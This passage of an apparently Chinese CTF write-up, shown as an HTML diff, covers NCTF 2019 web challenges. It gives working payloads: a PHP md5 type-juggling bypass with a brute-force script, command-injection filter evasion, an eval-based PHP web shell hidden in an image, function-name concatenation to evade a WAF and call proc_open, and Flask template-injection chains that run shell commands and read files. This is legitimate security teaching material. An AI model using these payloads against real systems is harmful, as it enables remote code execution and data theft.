class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$string_1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$md5_1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$string_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$md5_2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$string_2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span> <span class="token operator">!=</span> <span class="token variable">$md5_2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">strtr</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">,</span> <span class="token string">'cxhp'</span><span class="token punctuation">,</span> <span class="token string">'0123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">strtr</span><span class="token punctuation">(</span><span class="token variable">$md5_2</span><span class="token punctuation">,</span> <span class="token string">'cxhp'</span><span class="token punctuation">,</span> <span class="token string">'0123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">'2nd ok'</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"can u give me the right str???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'is str1 numeric??????'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
 <p>弱类型比较，当两个字符串以0e开头且全为数字时，==会判断他们相等，返回bool(true)，如</p>
 <p><img src="1574588638162.png" alt="1574588638162"></p>
 <p>所以就有思路啦，需要$string_1是数字，$string_1和$string_2的md5值不等，但把$string_1和$string_2进行md5算法后的值’cxhp’替换为’0123’后，$a==$b，所以我们可以找出数字，md5算法后的值为0e或ce开头，且内容全为数字或’cxhp’，写个脚本跑了一下跑出一个数字，两个字符满足要求，脚本如下，然后让str1=2120624&amp;str2=0yFCJ即可绕过第二步。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0yFCJ	0dmRZ	2120624</span><br></pre></td></tr></table></figure>
+<pre><code>0yFCJ    0dmRZ    2120624</code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic = <span class="string">'0123456789qwertyuiopASDFGHJKLzxcvbnmQWERTYUIOPasdfghjklZXCVBNM'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(key)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(key.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> dic:</span><br><span class="line">                    f=a + b + c + d + e</span><br><span class="line">                    T = md5(f)</span><br><span class="line">                    T = T.replace(<span class="string">'c'</span>, <span class="string">'0'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'x'</span>, <span class="string">'1'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'h'</span>, <span class="string">'2'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'p'</span>, <span class="string">'3'</span>)</span><br><span class="line">                    <span class="keyword">if</span>((T)[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span> <span class="keyword">and</span> (T)[<span class="number">3</span>:].isdigit()):</span><br><span class="line">                        print(f)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">import hashlib</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def md5(key):</span></span><br><span class="line"><span class="string">    m = hashlib.md5()</span></span><br><span class="line"><span class="string">    m.update(key.encode('utf-8'))</span></span><br><span class="line"><span class="string">    return m.hexdigest()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(1000000000):</span></span><br><span class="line"><span class="string">    T = md5(str(i))</span></span><br><span class="line"><span class="string">    T = T.replace('c', '0')</span></span><br><span class="line"><span class="string">    T = T.replace('x', '1')</span></span><br><span class="line"><span class="string">    T = T.replace('h', '2')</span></span><br><span class="line"><span class="string">    T = T.replace('p', '3')</span></span><br><span class="line"><span class="string">    if ((T)[0:2] == '0e' and (T)[3:].isdigit()):</span></span><br><span class="line"><span class="string">        print(i)</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+dic <span class="token operator">=</span> <span class="token string">'0123456789qwertyuiopASDFGHJKLzxcvbnmQWERTYUIOPasdfghjklZXCVBNM'</span>
+<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> a <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> b <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> c <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+            <span class="token keyword">for</span> d <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+                <span class="token keyword">for</span> e <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+                    f<span class="token operator">=</span>a <span class="token operator">+</span> b <span class="token operator">+</span> c <span class="token operator">+</span> d <span class="token operator">+</span> e
+                    T <span class="token operator">=</span> md5<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+                    T <span class="token operator">=</span> T<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+                    T <span class="token operator">=</span> T<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
+                    T <span class="token operator">=</span> T<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
+                    T <span class="token operator">=</span> T<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
+                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'0e'</span> <span class="token operator">and</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+                        <span class="token keyword">break</span>
+<span class="token triple-quoted-string string">'''
+import hashlib
 
+def md5(key):
+    m = hashlib.md5()
+    m.update(key.encode('utf-8'))
+    return m.hexdigest()
+
+for i in range(1000000000):
+    T = md5(str(i))
+    T = T.replace('c', '0')
+    T = T.replace('x', '1')
+    T = T.replace('h', '2')
+    T = T.replace('p', '3')
+    if ((T)[0:2] == '0e' and (T)[3:].isdigit()):
+        print(i)
+        break
+'''</span></code></pre>
 <p>3rd</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"too long :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
+<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token string">'%5f'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'ls'</span> <span class="token operator">||</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'pwd'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token string">'cat'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'ban cat :) '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad guy!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'nonono _ is bad'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span> </code></pre>
 <p>这个是要让请求的字符串中不能含_和%5f(%5f为_的url编码)，但又要对q_w_q传值。。。开始想了很久没有思路，问了大佬，他说_可以用.来代替，没想到这样也可以学到了学到了，所以对q.w.q传值即可，然后就简单啦，令q.w.q=more *.*就可以啦，*是通配符，more以全屏幕的方式按页显示文本文件的内容 </p>
 <p>最终完整payload为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60005/?num=23333%0a&amp;str1=2120624&amp;str2=0yFCJ&amp;q.w.q=more *.*</span></span><br></pre></td></tr></table></figure>
-
-
-
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//nctf2019.x1ct34m.com:60005/?num=23333%0a&amp;str1=2120624&amp;str2=0yFCJ&amp;q.w.q=more *.*</span></code></pre>
 <h1 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h1><p>看源码，发现了这个./index.php?action=imgs.html</p>
 <p>点进去看了一下，就是上传点，有文件类型检测，做一个图片马，copy 1.jpg/b+2.php/a 1.jpg(文件包含解析b表示二进制，a表示ascii码)，然后发现不能有&lt;?，这个之前考过，这样写就可以啦</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
 <p>上传成功后给了个地址，action包含这个地址就可以啦，最终payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/ed8c5de065c6151959b08babc2521a15/Th1s_is_a_fl4g.jpg</span></span><br></pre></td></tr></table></figure>
-
-
-
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/ed8c5de065c6151959b08babc2521a15/Th1s_is_a_fl4g.jpg</span></code></pre>
 <h1 id="hacker-backdoor"><a href="#hacker-backdoor" class="headerlink" title="hacker_backdoor"></a>hacker_backdoor</h1><p>这个题目也是绕过，waf ban了所有函数和eval，assert，但是可以用字符串拼接绕过，这个题也学到了很多知识，原来eval也可以执行一段代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='php'.'info';%0a$a();&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//nctf2019.x1ct34m.com:60004/?code=$a='php'.'info';%0a$a();&amp;useful=index.php</span></code></pre>
 <p>先看一下phpinfo()的disable_function，发现ban了很多函数还包括scandir，readfile，file_get_contents这样的函数（这里没仔细看，其实它放了一个命令执行函数proc_open）后面会发现这个问题，先不说，进行常规步骤，我是找替代scandir，readfile这样的函数，发现了glob函数和highlight_file函数可以使用。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='var_'.'dump';%0a$b='gl'.'ob';%0a$c='../../../*';%0a$a($b($c));&amp;useful=index.php		//遍历目录</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='highl'.'ight_f'.'ile';%0a$c='../../../readflag';%0a$a($c);&amp;useful=index.php		//读取内容</span></span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//nctf2019.x1ct34m.com:60004/?code=$a='var_'.'dump';%0a$b='gl'.'ob';%0a$c='../../../*';%0a$a($b($c));&amp;useful=index.php        //遍历目录</span></code></pre>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//nctf2019.x1ct34m.com:60004/?code=$a='highl'.'ight_f'.'ile';%0a$c='../../../readflag';%0a$a($c);&amp;useful=index.php        //读取内容</span></code></pre>
 <p>本以为这样读flag就结束了，可是它竟然读不了。。。后来看到了readflag就知道是要用这个读啦，盲猜readflag的内容是cat /flag，所以想办法执行readflag就行了，返回去看disable_functions，ban了那么多函数，以为命令执行函数早被禁完了，但是最终发现没有ban proc_open函数，所以用它执行readflag命令，最终payload如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$test="../../.././readflag";%0a$z='p'.'ipe';%0a$b='proc'.'_open';%0a$c='var_d'.'ump';%0a$d='strea'.'m_get_c'.'ontents';%0a$e='proc_c'.'lose';%0a$a=array(array("$z","r"),array("$z","w"),array("$z","w"));%0a$fp = $b($test,$a,$zs);%0a$c($d($zs[1]));%0a$e($fp);&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>
-
-
-
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//nctf2019.x1ct34m.com:60004/?code=$test="../../.././readflag";%0a$z='p'.'ipe';%0a$b='proc'.'_open';%0a$c='var_d'.'ump';%0a$d='strea'.'m_get_c'.'ontents';%0a$e='proc_c'.'lose';%0a$a=array(array("$z","r"),array("$z","w"),array("$z","w"));%0a$fp = $b($test,$a,$zs);%0a$c($d($zs[1]));%0a$e($fp);&amp;useful=index.php</span></code></pre>
 <h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p>额，这是一个Flask模板注入 ，具体原因可以看这篇文章    <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">传送门</a></p>
 <p>直接上payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/&#123;&#123;<span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">'ls ..'</span>).read()&#125;&#125;	//执行命令</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>nctf2019<span class="token punctuation">.</span>x1ct34m<span class="token punctuation">.</span>com<span class="token punctuation">:</span><span class="token number">40007</span><span class="token operator">/</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls ..'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token operator">//</span>执行命令</code></pre>
 <p>这里看到了flag直接cat ../flag是禁止的，于是用ascii编码绕过，最终payload为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)+chr(<span class="number">102</span>)+chr(<span class="number">108</span>)+chr(<span class="number">97</span>)+chr(<span class="number">103</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
+<pre class=" language-python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>nctf2019<span class="token punctuation">.</span>x1ct34m<span class="token punctuation">.</span>com<span class="token punctuation">:</span><span class="token number">40007</span><span class="token operator">/</span><span class="token punctuation">{</span><span class="token operator">%</span> set chr<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span>chr <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
 <h1 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h1><p>也是一个xxe，要通过xxe内网探测，读一下/proc/net/arp文件，这个文件用来显示当前路由器上，client的name，ip，mac，connect_type信息，具体介绍如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line">192.168.1.234    0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">192.168.1.241    0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line"></span><br><span class="line">每个网络接口的arp表中dev包的统计</span><br><span class="line">IP address：IP地址（直连）</span><br><span class="line">HW type：硬件类型 </span><br><span class="line">23=0x17   strip (Metricom Starmode IP) </span><br><span class="line">01=0x01   ether (Ethernet) </span><br><span class="line">15=0xf      dlci (Frame Relay DLCI) </span><br><span class="line">Flags：</span><br><span class="line">HW address：MAC 地址</span><br><span class="line">Mask：</span><br><span class="line">Device：所在网络接口</span><br></pre></td></tr></table></figure>
+<pre><code>IP address       HW type     Flags       HW address            Mask     Device
+192.168.1.234    0x1         0x0         00:00:00:00:00:00     *        eth0
+192.168.1.241    0x1         0x0         00:00:00:00:00:00     *        eth0
 
-<p>之后一个一个试就可以了，结果如下</p>
+每个网络接口的arp表中dev包的统计
+IP address：IP地址（直连）
+HW type：硬件类型 
+23=0x17   strip (Metricom Starmode IP) 
+01=0x01   ether (Ethernet) 
+15=0xf      dlci (Frame Relay DLCI) 
+Flags：
+HW address：MAC 地址
+Mask：
+Device：所在网络接口</code></pre><p>之后一个一个试就可以了，结果如下</p>
